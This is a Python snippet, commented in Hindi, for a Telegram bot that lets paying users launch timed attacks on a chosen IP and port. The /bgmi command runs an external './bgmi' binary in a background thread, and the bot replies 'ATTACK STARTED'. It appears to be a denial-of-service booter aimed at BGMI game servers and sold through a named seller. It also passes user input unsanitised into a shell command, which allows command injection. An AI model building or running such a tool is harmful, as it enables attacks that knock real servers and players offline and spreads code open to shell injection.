import telebot
import subprocess
import datetime
import os
import threading  # यह नया है

# आपका जो भी Bot Token और फाइल का setup है, वो यहाँ रहेगा
# (इनको अपने कोड में से यहाँ ज़रूर लिखें)
# bot = telebot.TeleBot('YOUR_TOKEN')
# LOG_FILE = "logs.txt"
# USER_FILE = "users.txt"
# allowed_user_ids = [...]
# admin_id = [...]

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 5

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                response = "You Are On Cooldown ❌. Please Wait 5 second Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_val = int(command[3])
            
            if time_val > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time_val)
                log_command(user_id, target, port, time_val)
                start_attack_reply(message, target, port, time_val)
                
                # यहाँ बैकग्राउंड में अटैक चलाने का लॉजिक:
                full_command = f"./bgmi {target} {port} {time_val} 300"
                
                def run_attack():
                    subprocess.run(full_command, shell=True)
                
                # अटैक को बैकग्राउंड में शुरू करें (यह बॉट को रुकने नहीं देगा)
                threading.Thread(target=run_attack).start()
                return # यहाँ से फंक्शन ख़त्म हो जाएगा, 'Finished' मैसेज नहीं भेजेगा
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"
    else:
        response = "❌ Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se ❌."
    bot.reply_to(message, response)

# बाकी आपके सारे commands (start, help, mylogs, आदि) यहाँ नीचे वैसे ही रहेंगे...
# bot.polling()
